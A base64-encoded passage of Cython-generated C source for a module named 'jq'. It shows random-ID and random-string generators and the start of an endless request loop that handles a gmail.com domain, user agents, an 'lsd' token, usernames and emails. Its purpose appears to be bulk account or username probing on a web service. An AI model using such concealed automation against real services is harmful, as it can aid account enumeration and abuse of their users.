c2l6ZW9mKHZhbHVlcykvc2l6ZW9mKHZhbHVlc1swXSkpOyArK19fcHl4X3RlbXApIHtcbiAgICBQeV9YREVDUkVGKHZhbHVlc1tfX3B5eF90ZW1wXSk7XG4gIH1cbiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gIHJldHVybiBfX3B5eF9yO1xufVxuXG5zdGF0aWMgUHlPYmplY3QgKl9fcHl4X3BmXzJqcV8xNnJhbmRfaWRzKENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKl9fcHl4X3NlbGYsIFB5T2JqZWN0ICpfX3B5eF92X2JiaywgUHlPYmplY3QgKl9fcHl4X3ZfSWRvKSB7XG4gIFB5T2JqZWN0ICpfX3B5eF92X0lkID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3IgPSBOVUxMO1xuICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9uc1xuICBQeU9iamVjdCAqX19weXhfdF8xID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMiA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzMgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF80ID0gTlVMTDtcbiAgc2l6ZV90IF9fcHl4X3RfNTtcbiAgaW50IF9fcHl4X3RfNjtcbiAgaW50IF9fcHl4X3RfNztcbiAgaW50IF9fcHl4X2xpbmVubyA9IDA7XG4gIGNvbnN0IGNoYXIgKl9fcHl4X2ZpbGVuYW1lID0gTlVMTDtcbiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwO1xuICBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgicmFuZF9pZHMiLCAwKTtcblxuICBcbiAgX19weXhfdF8yID0gTlVMTDtcbiAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yYW5kb20pOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCA0MDQsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTtcbiAgX19weXhfdF80ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yYW5kcmFuZ2UpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCA0MDQsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG4gIF9fcHl4X3RfNSA9IDE7XG4gICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFNcbiAgaWYgKHVubGlrZWx5KFB5TWV0aG9kX0NoZWNrKF9fcHl4X3RfNCkpKSB7XG4gICAgX19weXhfdF8yID0gUHlNZXRob2RfR0VUX1NFTEYoX19weXhfdF80KTtcbiAgICBhc3NlcnQoX19weXhfdF8yKTtcbiAgICBQeU9iamVjdCogX19weXhfX2Z1bmN0aW9uID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKF9fcHl4X3RfNCk7XG4gICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMik7XG4gICAgX19QeXhfSU5DUkVGKF9fcHl4X19mdW5jdGlvbik7XG4gICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF90XzQsIF9fcHl4X19mdW5jdGlvbik7XG4gICAgX19weXhfdF81ID0gMDtcbiAgfVxuICAjZW5kaWZcbiAge1xuICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1szXSA9IHtfX3B5eF90XzIsIF9fcHl4X3ZfYmJrLCBfX3B5eF92X0lkb307XG4gICAgX19weXhfdF8xID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF80LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzUsICgzLV9fcHl4X3RfNSkgfCAoX19weXhfdF81Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcbiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCA0MDQsIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpO1xuICB9XG4gIF9fcHl4X3RfNCA9IF9fUHl4X1B5T2JqZWN0X1VuaWNvZGUoX19weXhfdF8xKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgNDA0LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwO1xuICBfX3B5eF92X0lkID0gKChQeU9iamVjdCopX19weXhfdF80KTtcbiAgX19weXhfdF80ID0gMDtcblxuICBcbiAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9pZHMpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCA0MDUsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTtcbiAgX19weXhfdF82ID0gKF9fUHl4X1B5U2VxdWVuY2VfQ29udGFpbnNURihfX3B5eF92X0lkLCBfX3B5eF90XzQsIFB5X05FKSk7IGlmICh1bmxpa2VseSgoX19weXhfdF82IDwgMCkpKSBfX1BZWF9FUlIoMCwgNDA1LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gIGlmIChfX3B5eF90XzYpIHtcblxuICAgIFxuICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfaWRzKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgNDA2LCBfX3B5eF9MMV9lcnJvcilcbiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTtcbiAgICBfX3B5eF90XzcgPSBfX1B5eF9QeU9iamVjdF9BcHBlbmQoX19weXhfdF80LCBfX3B5eF92X0lkKTsgaWYgKHVubGlrZWx5KF9fcHl4X3RfNyA9PSAoKGludCktMSkpKSBfX1BZWF9FUlIoMCwgNDA2LCBfX3B5eF9MMV9lcnJvcilcbiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcblxuICAgIFxuICAgIF9fUHl4X1hERUNSRUYoX19weXhfcik7XG4gICAgX19QeXhfSU5DUkVGKF9fcHl4X3ZfSWQpO1xuICAgIF9fcHl4X3IgPSBfX3B5eF92X0lkO1xuICAgIGdvdG8gX19weXhfTDA7XG5cbiAgICBcbiAgfVxuXG4gIFxuICAge1xuICAgIF9fcHl4X3RfMSA9IE5VTEw7XG4gICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yYW5kX2lkcyk7IGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDQwOSwgX19weXhfTDFfZXJyb3IpXG4gICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7XG4gICAgX19weXhfdF81ID0gMTtcbiAgICAjaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTXG4gICAgaWYgKHVubGlrZWx5KFB5TWV0aG9kX0NoZWNrKF9fcHl4X3RfMikpKSB7XG4gICAgICBfX3B5eF90XzEgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzIpO1xuICAgICAgYXNzZXJ0KF9fcHl4X3RfMSk7XG4gICAgICBQeU9iamVjdCogX19weXhfX2Z1bmN0aW9uID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKF9fcHl4X3RfMik7XG4gICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF8xKTtcbiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pO1xuICAgICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF90XzIsIF9fcHl4X19mdW5jdGlvbik7XG4gICAgICBfX3B5eF90XzUgPSAwO1xuICAgIH1cbiAgICAjZW5kaWZcbiAgICB7XG4gICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbM10gPSB7X19weXhfdF8xLCBfX3B5eF92X2JiaywgX19weXhfdl9JZG99O1xuICAgICAgX19weXhfdF80ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF8yLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzUsICgzLV9fcHl4X3RfNSkgfCAoX19weXhfdF81Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG4gICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCA0MDksIF9fcHl4X0wxX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gICAgfVxuICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICB9XG5cbiAgXG5cbiAgXG4gIF9fcHl4X3IgPSBQeV9Ob25lOyBfX1B5eF9JTkNSRUYoUHlfTm9uZSk7XG4gIGdvdG8gX19weXhfTDA7XG4gIF9fcHl4X0wxX2Vycm9yOjtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF8zKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpO1xuICBfX1B5eF9BZGRUcmFjZWJhY2soImpxLnJhbmRfaWRzIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7XG4gIF9fcHl4X3IgPSBOVUxMO1xuICBfX3B5eF9MMDo7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl9JZCk7XG4gIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3IpO1xuICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTtcbiAgcmV0dXJuIF9fcHl4X3I7XG59XG5cblxuXG5cbnN0YXRpYyBQeU9iamVjdCAqX19weXhfcHdfMmpxXzE5dXV1KFB5T2JqZWN0ICpfX3B5eF9zZWxmLCBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICp1bnVzZWQpOyBcbnN0YXRpYyBQeU1ldGhvZERlZiBfX3B5eF9tZGVmXzJqcV8xOXV1dSA9IHsidXV1IiwgKFB5Q0Z1bmN0aW9uKV9fcHl4X3B3XzJqcV8xOXV1dSwgTUVUSF9OT0FSR1MsIDB9O1xuc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wd18yanFfMTl1dXUoUHlPYmplY3QgKl9fcHl4X3NlbGYsIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKnVudXNlZCkge1xuICBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpjb25zdCAqX19weXhfa3d2YWx1ZXM7XG4gIFB5T2JqZWN0ICpfX3B5eF9yID0gMDtcbiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnNcbiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoInV1dSAod3JhcHBlcikiLCAwKTtcbiAgX19weXhfa3d2YWx1ZXMgPSBfX1B5eF9Ld1ZhbHVlc19WQVJBUkdTKF9fcHl4X2FyZ3MsIF9fcHl4X25hcmdzKTtcbiAgX19weXhfciA9IF9fcHl4X3BmXzJqcV8xOHV1dShfX3B5eF9zZWxmKTtcblxuICBcbiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gIHJldHVybiBfX3B5eF9yO1xufVxuc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9nYl8yanFfM3V1dV8yZ2VuZXJhdG9yMyhfX3B5eF9Db3JvdXRpbmVPYmplY3QgKl9fcHl4X2dlbmVyYXRvciwgQ1lUSE9OX1VOVVNFRCBQeVRocmVhZFN0YXRlICpfX3B5eF90c3RhdGUsIFB5T2JqZWN0ICpfX3B5eF9zZW50X3ZhbHVlKTsgXG5cblxuXG5zdGF0aWMgUHlPYmplY3QgKl9fcHl4X3BmXzJqcV8zdXV1X2dlbmV4cHIoQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqX19weXhfc2VsZikge1xuICBzdHJ1Y3QgX19weXhfb2JqXzJqcV9fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByICpfX3B5eF9jdXJfc2NvcGU7XG4gIFB5T2JqZWN0ICpfX3B5eF9yID0gTlVMTDtcbiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnNcbiAgaW50IF9fcHl4X2xpbmVubyA9IDA7XG4gIGNvbnN0IGNoYXIgKl9fcHl4X2ZpbGVuYW1lID0gTlVMTDtcbiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwO1xuICBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgiZ2VuZXhwciIsIDApO1xuICBfX3B5eF9jdXJfc2NvcGUgPSAoc3RydWN0IF9fcHl4X29ial8yanFfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwciAqKV9fcHl4X3RwX25ld18yanFfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwcihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9wdHlwZV8yanFfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwciwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdHVwbGUsIE5VTEwpO1xuICBpZiAodW5saWtlbHkoIV9fcHl4X2N1cl9zY29wZSkpIHtcbiAgICBfX3B5eF9jdXJfc2NvcGUgPSAoKHN0cnVjdCBfX3B5eF9vYmpfMmpxX19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHIgKilQeV9Ob25lKTtcbiAgICBfX1B5eF9JTkNSRUYoUHlfTm9uZSk7XG4gICAgX19QWVhfRVJSKDAsIDQyNCwgX19weXhfTDFfZXJyb3IpXG4gIH0gZWxzZSB7XG4gICAgX19QeXhfR09UUkVGKChQeU9iamVjdCAqKV9fcHl4X2N1cl9zY29wZSk7XG4gIH1cbiAge1xuICAgIF9fcHl4X0Nvcm91dGluZU9iamVjdCAqZ2VuID0gX19QeXhfR2VuZXJhdG9yX05ldygoX19weXhfY29yb3V0aW5lX2JvZHlfdCkgX19weXhfZ2JfMmpxXzN1dXVfMmdlbmVyYXRvcjMsICgoUHlPYmplY3QgKilfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYlszXSksIChQeU9iamVjdCAqKSBfX3B5eF9jdXJfc2NvcGUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9nZW5leHByLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdXV1X2xvY2Fsc19nZW5leHByLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfanEpOyBpZiAodW5saWtlbHkoIWdlbikpIF9fUFlYX0VSUigwLCA0MjQsIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fUHl4X0RFQ1JFRihfX3B5eF9jdXJfc2NvcGUpO1xuICAgIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpO1xuICAgIHJldHVybiAoUHlPYmplY3QgKikgZ2VuO1xuICB9XG5cbiAgXG4gIF9fcHl4X0wxX2Vycm9yOjtcbiAgX19QeXhfQWRkVHJhY2ViYWNrKCJqcS51dXUuZ2VuZXhwciIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpO1xuICBfX3B5eF9yID0gTlVMTDtcbiAgX19QeXhfREVDUkVGKChQeU9iamVjdCAqKV9fcHl4X2N1cl9zY29wZSk7XG4gIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3IpO1xuICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTtcbiAgcmV0dXJuIF9fcHl4X3I7XG59XG5cbnN0YXRpYyBQeU9iamVjdCAqX19weXhfZ2JfMmpxXzN1dXVfMmdlbmVyYXRvcjMoX19weXhfQ29yb3V0aW5lT2JqZWN0ICpfX3B5eF9nZW5lcmF0b3IsIENZVEhPTl9VTlVTRUQgUHlUaHJlYWRTdGF0ZSAqX19weXhfdHN0YXRlLCBQeU9iamVjdCAqX19weXhfc2VudF92YWx1ZSkgXG57XG4gIHN0cnVjdCBfX3B5eF9vYmpfMmpxX19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHIgKl9fcHl4X2N1cl9zY29wZSA9ICgoc3RydWN0IF9fcHl4X29ial8yanFfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwciAqKV9fcHl4X2dlbmVyYXRvci0+Y2xvc3VyZSk7XG4gIFB5T2JqZWN0ICpfX3B5eF9yID0gTlVMTDtcbiAgbG9uZyBfX3B5eF90XzE7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzIgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF8zID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfNCA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzUgPSBOVUxMO1xuICBzaXplX3QgX19weXhfdF82O1xuICBpbnQgX19weXhfbGluZW5vID0gMDtcbiAgY29uc3QgY2hhciAqX19weXhfZmlsZW5hbWUgPSBOVUxMO1xuICBpbnQgX19weXhfY2xpbmVubyA9IDA7XG4gIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zXG4gIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJnZW5leHByIiwgMCk7XG4gIHN3aXRjaCAoX19weXhfZ2VuZXJhdG9yLT5yZXN1bWVfbGFiZWwpIHtcbiAgICBjYXNlIDA6IGdvdG8gX19weXhfTDNfZmlyc3RfcnVuO1xuICAgIGRlZmF1bHQ6IFxuICAgIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpO1xuICAgIHJldHVybiBOVUxMO1xuICB9XG4gIF9fcHl4X0wzX2ZpcnN0X3J1bjo7XG4gIGlmICh1bmxpa2VseSghX19weXhfc2VudF92YWx1ZSkpIF9fUFlYX0VSUigwLCA0MjQsIF9fcHl4X0wxX2Vycm9yKVxuICBfX3B5eF9yID0gUHlMaXN0X05ldygwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9yKSkgX19QWVhfRVJSKDAsIDQyNCwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF9yKTtcblxuICBcbiAgZm9yIChfX3B5eF90XzEgPSAwOyBfX3B5eF90XzEgPCAzMjsgX19weXhfdF8xKz0xKSB7XG4gICAgX19weXhfY3VyX3Njb3BlLT5fX3B5eF92X18gPSBfX3B5eF90XzE7XG5cbiAgICBcbiAgICBfX3B5eF90XzMgPSBOVUxMO1xuICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmFuZG9tKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgNDI0LCBfX3B5eF9MMV9lcnJvcilcbiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTtcbiAgICBfX3B5eF90XzUgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2Nob2ljZSk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDQyNCwgX19weXhfTDFfZXJyb3IpXG4gICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7XG4gICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgX19weXhfdF82ID0gMTtcbiAgICAjaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTXG4gICAgaWYgKHVubGlrZWx5KFB5TWV0aG9kX0NoZWNrKF9fcHl4X3RfNSkpKSB7XG4gICAgICBfX3B5eF90XzMgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzUpO1xuICAgICAgYXNzZXJ0KF9fcHl4X3RfMyk7XG4gICAgICBQeU9iamVjdCogX19weXhfX2Z1bmN0aW9uID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKF9fcHl4X3RfNSk7XG4gICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF8zKTtcbiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pO1xuICAgICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF90XzUsIF9fcHl4X19mdW5jdGlvbik7XG4gICAgICBfX3B5eF90XzYgPSAwO1xuICAgIH1cbiAgICAjZW5kaWZcbiAgICB7XG4gICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8zLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfYXplcnR5dWlvcG1sa2poZ2Zkc3F3eGN2Ym5BWkVSVFl9O1xuICAgICAgX19weXhfdF8yID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF81LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzYsICgyLV9fcHl4X3RfNikgfCAoX19weXhfdF82Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCA0MjQsIF9fcHl4X0wxX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7XG4gICAgfVxuICAgIGlmICh1bmxpa2VseShfX1B5eF9MaXN0Q29tcF9BcHBlbmQoX19weXhfciwgKFB5T2JqZWN0KilfX3B5eF90XzIpKSkgX19QWVhfRVJSKDAsIDQyNCwgX19weXhfTDFfZXJyb3IpXG4gICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG4gIH1cbiAgQ1lUSE9OX01BWUJFX1VOVVNFRF9WQVIoX19weXhfY3VyX3Njb3BlKTtcblxuICBcbiAgZ290byBfX3B5eF9MMDtcbiAgX19weXhfTDFfZXJyb3I6O1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3IpOyBfX3B5eF9yID0gMDtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMyk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpO1xuICBpZiAoX19QeXhfUHlFcnJfT2NjdXJyZWQoKSkge1xuICAgIF9fUHl4X0dlbmVyYXRvcl9SZXBsYWNlX1N0b3BJdGVyYXRpb24oMCk7XG4gICAgX19QeXhfQWRkVHJhY2ViYWNrKCJnZW5leHByIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7XG4gIH1cbiAgX19weXhfTDA6O1xuICBfX1B5eF9YR0lWRVJFRihfX3B5eF9yKTtcbiAgI2lmICFDWVRIT05fVVNFX0VYQ19JTkZPX1NUQUNLXG4gIF9fUHl4X0Nvcm91dGluZV9SZXNldEFuZENsZWFyRXhjZXB0aW9uKF9fcHl4X2dlbmVyYXRvcik7XG4gICNlbmRpZlxuICBfX3B5eF9nZW5lcmF0b3ItPnJlc3VtZV9sYWJlbCA9IC0xO1xuICBfX1B5eF9Db3JvdXRpbmVfY2xlYXIoKFB5T2JqZWN0KilfX3B5eF9nZW5lcmF0b3IpO1xuICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTtcbiAgcmV0dXJuIF9fcHl4X3I7XG59XG5cblxuXG5zdGF0aWMgUHlPYmplY3QgKl9fcHl4X3BmXzJqcV8xOHV1dShDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpfX3B5eF9zZWxmKSB7XG4gIFB5T2JqZWN0ICpfX3B5eF92X2RvbWFpbiA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF92X2JiayA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF92X0lkbyA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF92X3JuZCA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF92X3VzZXJfYWdlbnQgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdl9JZCA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF92X2xzZCA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF92X2hlYWRlcnMgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdl9kYXRhID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3ZfcmVzcG9uc2UgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdl91c2VybmFtZSA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF92X3JyID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3ZfZm93cyA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF92X2VtYWlsID0gTlVMTDtcbiAgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqX19weXhfdl9lID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X2diXzJqcV8zdXV1XzJnZW5lcmF0b3IzID0gMDtcbiAgUHlPYmplY3QgKl9fcHl4X3IgPSBOVUxMO1xuICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9uc1xuICBQeU9iamVjdCAqX19weXhfdF8xID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMiA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzMgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF80ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfNSA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzYgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF83ID0gTlVMTDtcbiAgc2l6ZV90IF9fcHl4X3RfODtcbiAgUHlPYmplY3QgKl9fcHl4X3RfOSA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzEwID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMTEgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF8xMiA9IE5VTEw7XG4gIGludCBfX3B5eF90XzEzO1xuICBpbnQgX19weXhfdF8xNDtcbiAgaW50IF9fcHl4X2xpbmVubyA9IDA7XG4gIGNvbnN0IGNoYXIgKl9fcHl4X2ZpbGVuYW1lID0gTlVMTDtcbiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwO1xuICBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgidXV1IiwgMCk7XG5cbiAgXG4gIHdoaWxlICgxKSB7XG5cbiAgICBcbiAgICB7XG4gICAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2RlY2xhcmVcbiAgICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfYXNzaWduXG4gICAgICBfX1B5eF9FeGNlcHRpb25TYXZlKCZfX3B5eF90XzEsICZfX3B5eF90XzIsICZfX3B5eF90XzMpO1xuICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzEpO1xuICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzIpO1xuICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzMpO1xuICAgICAgIHtcblxuICAgICAgICBcbiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfZ21haWxfY29tXzIpO1xuICAgICAgICBfX1B5eF9YREVDUkVGX1NFVChfX3B5eF92X2RvbWFpbiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9nbWFpbF9jb21fMik7XG5cbiAgICAgICAgXG4gICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9tc3RhdGVfZ2xvYmF